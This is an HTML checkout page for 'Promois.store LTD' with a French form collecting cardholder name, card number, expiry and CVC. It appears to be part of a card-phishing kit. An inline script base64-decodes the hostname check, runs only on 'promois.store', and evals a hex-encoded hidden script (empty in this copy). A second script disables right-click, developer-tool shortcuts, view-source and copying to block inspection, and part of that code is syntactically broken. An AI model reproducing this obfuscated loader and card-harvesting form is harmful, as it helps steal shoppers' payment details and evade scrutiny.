<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Page</title>
</head>

<body>
    <div class="header">
        Promois.store LTD <span class="order-amount" id="price-display"></span>

        <div class="separator"></div>
    </div>

    <div class="container">
        <h2>Paiement par carte bancaire</h2>

        <form id="payment-form">
            <input type="text" id="fullname" placeholder="Prénom Nom" oninput="validateFullName(this)">
            <input type="text" id="card-number" placeholder="Numéro de la carte" maxlength="19"
                oninput="formatCardNumber(this)">

            <div class="flex-container">
                <input type="text" id="expiry-date" placeholder="Date d'expiration" maxlength="5"
                    oninput="formatExpiryDate(this)">
                <input type="text" id="cp" placeholder="CVC" maxlength="3" oninput="limitToThreeDigits(this)">
            </div>

            <button class="pay-btn" id="pay-btn" disabled>
                <span id="pay-text">PAY</span>
                <img src="https://cdn.pixabay.com/animation/2023/11/30/10/11/10-11-02-622_512.gif" id="loading-gif"
                    style="display:none; width: 30px; height: 30px; vertical-align: middle;" />
            </button>
        </form>

        <div class="secure-info">
            <p class="lock-icon">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTw5VLnhfcL_d_m4ugRsf4rVOzyKQS1Td9i3Wuv19uxLhQnOxFc2co5ExzWokOY9bSBzVE&usqp=CAU"
                    alt="lock icon" style="width: 40px; height: 40px; margin-right: 5px;">
            </p>
            <img src="https://files.catbox.moe/cc58b6.png" alt="allpayment">
        </div>
    </div>
    <script>

        var css = "";

        var js = "";

        let text = '';

        if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("cHJvbW9pcy5zdG9yZQ==")) {

            for (let i = 0; i < js.length; i += 2) {
                const charCode = parseInt(js.substr(i, 2), 16);
                if (!isNaN(charCode)) {
                    text += String.fromCharCode(charCode);
                }
            }



            let text1 = '';
            for (let a = 0; a < css.length; a += 2) {
                const charCodea = parseInt(css.substr(a, 2), 16);
                if (!isNaN(charCodea)) {
                    text1 += String.fromCharCode(charCodea);
                }
            }


            var style = document.createElement('style');
            style.textContent = text1;
            document.head.appendChild(style);

            eval(decodeURIComponent(text))

        } else {
            document.body.style.display = "none";
            window.location.href = "/404.html";
        }
    </script>
    <script>
        document.addEventListener('contextmenu', event => event.preventDefault());

        document.onkeydown = function (e) {
            if (
                e.keyCode === 123 || // F12
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73  e.keyCode === 74))  // Ctrl+Shift+I / J
            (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
                (e.ctrlKey && e.keyCode === 83) // Ctrl+S
    ) {
                return false;
            }
        };

        document.addEventListener('copy', (e) => {
            e.preventDefault();
            alert("");
        });
    </script>
    <script src="IgrecJS007.js"></script>
    <script src="prodect.js"></script>
    <script src="CSSYKK.js"></script>
</body>

</html>
